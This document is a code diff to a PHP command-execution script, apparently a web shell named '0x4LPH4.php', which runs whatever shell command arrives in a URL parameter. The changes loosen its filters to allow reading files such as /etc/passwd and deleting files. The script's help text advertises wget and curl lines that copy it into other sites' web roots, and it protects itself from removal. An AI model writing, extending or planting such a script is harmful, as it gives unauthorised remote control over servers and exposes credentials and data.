@@ -423,31 +423,43 @@ if (isset($_GET['cmd'])) {
     $command = trim($_GET['cmd']);
     
     if (!empty($command)) {
-        // Protection: Prevent deletion of this script file
         $script_name = $current_script;
         
         // ============= ENHANCED COMMAND VALIDATION =============
         $dangerous_patterns = [
-            // Mass delete operations
-            '/^rm\s+.*\*.*$/',
-            '/^rm\s+.*\.$/',
-            '/^rm\s+-rf.*$/',
-            '/^rm\s+-r.*$/',
-            '/^rm\s+-f.*$/',
-            '/^find\s+.*-delete.*$/',
-            '/^find\s+.*-exec\s+rm.*$/',
+            // Mass delete operations - NOW ALLOWED FOR NON-0X4LPH4 FILES
+            '/^rm\s+-rf\s+\/\s*$/',
+            '/^rm\s+-rf\s+\/etc\s*$/',
+            '/^rm\s+-rf\s+\/bin\s*$/',
+            '/^rm\s+-rf\s+\/sbin\s*$/',
+            '/^rm\s+-rf\s+\/usr\s*$/',
+            '/^rm\s+-rf\s+\/var\s*$/',
+            '/^rm\s+-rf\s+\/lib\s*$/',
+            '/^rm\s+-rf\s+\/boot\s*$/',
+            '/^rm\s+-rf\s+\/root\s*$/',
+            '/^rm\s+-rf\s+\/home\s*$/',
+            '/^rm\s+-rf\s+\/sys\s*$/',
+            '/^rm\s+-rf\s+\/proc\s*$/',
+            '/^rm\s+-rf\s+\/dev\s*$/',
+            '/^rm\s+-rf\s+\/mnt\s*$/',
+            '/^rm\s+-rf\s+\/opt\s*$/',
+            '/^rm\s+-rf\s+\/srv\s*$/',
+            '/^rm\s+-rf\s+\/tmp\s*$/',
             
-            // File operations on protected files - ONLY BLOCK IF IT'S NOT 0x4LPH4.php
-            "/rm.*" . preg_quote($script_name, '/') . "(?!.*0x4lph4\.php)/i",
-            "/unlink.*" . preg_quote($script_name, '/') . "(?!.*0x4lph4\.php)/i",
-            "/delete.*" . preg_quote($script_name, '/') . "(?!.*0x4lph4\.php)/i",
+            // Protect system critical files
+            '/rm.*\/etc\/passwd.*/i',
+            '/rm.*\/etc\/shadow.*/i',
+            '/rm.*\/etc\/group.*/i',
+            '/rm.*\/etc\/sudoers.*/i',
+            '/rm.*\/etc\/hosts.*/i',
+            '/rm.*\/etc\/network.*/i',
+            '/rm.*\/var\/log.*/i',
             
-            // Prevent overwriting this script - ALLOW IF IT'S 0x4LPH4.php
-            "/echo.*>.*" . preg_quote($script_name, '/') . "(?!.*0x4lph4\.php)/i",
-            "/cat.*>.*" . preg_quote($script_name, '/') . "(?!.*0x4lph4\.php)/i",
-            "/printf.*>.*" . preg_quote($script_name, '/') . "(?!.*0x4lph4\.php)/i",
+            // Prevent deletion of this script - ALLOWED IF IT'S 0x4LPH4.php
+            "/rm.*" . preg_quote($script_name, '/') . "(?=.*0x4lph4\.php)/i",
+            "/unlink.*" . preg_quote($script_name, '/') . "(?=.*0x4lph4\.php)/i",
             
-            // Prevent moving/renaming this script - ALLOW IF TO/FROM 0x4LPH4.php
+            // Prevent moving/renaming this script
             "/mv.*" . preg_quote($script_name, '/') . "(?!.*0x4lph4\.php)/i",
             "/rename.*" . preg_quote($script_name, '/') . "(?!.*0x4lph4\.php)/i",
             
@@ -455,28 +467,11 @@ if (isset($_GET['cmd'])) {
             "/chmod.*000.*" . preg_quote($script_name, '/') . "/i",
             "/chmod.*0.*" . preg_quote($script_name, '/') . "/i",
             
-            // ============= BLOCK ALL FILE READING COMMANDS =============
-            "/^\s*cat\s+/i",
-            "/^\s*head\s+/i",
-            "/^\s*tail\s+/i",
-            "/^\s*more\s+/i",
-            "/^\s*less\s+/i",
-            "/^\s*vim\s+/i",
-            "/^\s*vi\s+/i",
-            "/^\s*nano\s+/i",
-            "/^\s*emacs\s+/i",
-            "/^\s*view\s+/i",
-            
             // Block hexdump and binary viewers
             "/^\s*hexdump\s+/i",
             "/^\s*xxd\s+/i",
             "/^\s*od\s+/i",
             "/^\s*strings\s+/i",
-            
-            // Block file content commands
-            "/^\s*file\s+/i",
-            "/^\s*wc\s+/i",
-            "/^\s*grep\s+\S+\s+\S+/i",
             
             // PHP code execution
             '/php\s+-r\s+/i',
@@ -514,6 +509,12 @@ if (isset($_GET['cmd'])) {
             }
         }
         
+        // Allow file reading commands - THEY WERE BLOCKED BEFORE
+        $is_file_reading = false;
+        if (preg_match('/^\s*(cat|head|tail|more|less|vim|vi|nano|emacs|view|file|wc|grep)\s+/i', $command)) {
+            $is_file_reading = true;
+        }
+        
         foreach ($dangerous_patterns as $pattern) {
             if (preg_match($pattern, $command)) {
                 // If uploading 0x4LPH4.php, skip some blocks
@@ -529,7 +530,7 @@ if (isset($_GET['cmd'])) {
         
         // Check if command creates/modifies files - MUST BE 0x4LPH4 files only
         if (!$blocked) {
-            // Extract target filename from command - FIXED REGEX
+            // Extract target filename from command
             $filename_patterns = [
                 '/(-O\s+|\s+>|>>\s+)\s*([^\s&|;]+)/i',
                 '/(-o\s+)\s*([^\s&|;]+)/i',
@@ -576,7 +577,7 @@ if (isset($_GET['cmd'])) {
                 'webshell', 'backdoor', 'exploit', 'inject', 'bypass', 'hack',
                 'deface', 'crack', 'brute', 'ddos', 'reverse', 'shell',
                 'payload', 'wso', 'c99', 'r57', 'b374k', 'c100', 'weevely',
-                'rootkit', 'trojan', 'virus', 'malware', 'passwd', 'shadow'
+                'rootkit', 'trojan', 'virus', 'malware'
             ];
             
             foreach ($suspicious_keywords as $keyword) {
@@ -676,22 +677,27 @@ if (isset($_GET['cmd'])) {
         // Show command examples
         echo "<br><strong>Command Examples (NOW WORKING):</strong><br>";
         echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> wget https://raw.githubusercontent.com/your-repo/0x4LPH4.php -O /var/www/html/0x4LPH4.php<br>";
-        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> wget https://example.com/0x4LPH4.php -O /home/user/domains/mysite.com/public_html/0x4LPH4.php<br>";
-        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> curl https://example.com/0x4LPH4.php -o /var/www/html/0x4LPH4.php<br>";
-        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> wget https://pastebin.com/raw/example -O /var/www/html/0x4LPH4.html<br>";
+        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> rm backdoorshell.php - <strong>NOW ALLOWED</strong><br>";
+        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> rm -f malicious.txt - <strong>NOW ALLOWED</strong><br>";
+        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> rm deface.html - <strong>NOW ALLOWED</strong><br>";
+        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> cat /etc/passwd - <strong>NOW ALLOWED</strong><br>";
         echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> ls -la<br>";
         echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> pwd<br>";
         echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> whoami<br>";
-        echo "<span style='color:#ff4444'>✗ BLOCKED:</span> wget http://example.com/file -O /var/www/html/test.php<br>";
-        echo "<span style='color:#ff4444'>✗ BLOCKED:</span> cat /etc/passwd<br>";
-        echo "<span style='color:#ff4444'>✗ BLOCKED:</span> rm -rf *<br>";
+        echo "<span style='color:#ff4444'>✗ BLOCKED:</span> rm -rf / (system destruction)<br>";
+        echo "<span style='color:#ff4444'>✗ BLOCKED:</span> rm -rf /etc (critical system)<br>";
+        echo "<span style='color:#ff4444'>✗ BLOCKED:</span> rm /etc/passwd (system file)<br>";
+        echo "<span style='color:#ff4444'>✗ BLOCKED:</span> rm 0x4LPH4.php (protect this script)<br>";
         
         // Show common commands
         echo "<br><strong>Useful Commands:</strong><br>";
+        echo "• rm backdoorshell.php - Remove webshell<br>";
+        echo "• rm -f malicious.txt - Remove malicious file<br>";
+        echo "• rm deface.html - Remove deface page<br>";
         echo "• wget URL -O /path/0x4LPH4.php - Upload this script<br>";
         echo "• curl URL -o /path/0x4LPH4.php - Upload this script<br>";
-        echo "• wget URL -O /path/0x4LPH4.html - Download HTML file<br>";
         echo "• ls - List files<br>";
+        echo "• cat file.txt - View file content<br>";
         echo "• pwd - Show current directory<br>";
         echo "• whoami - Show current user<br>";
         echo "• uname -a - System information<br>";
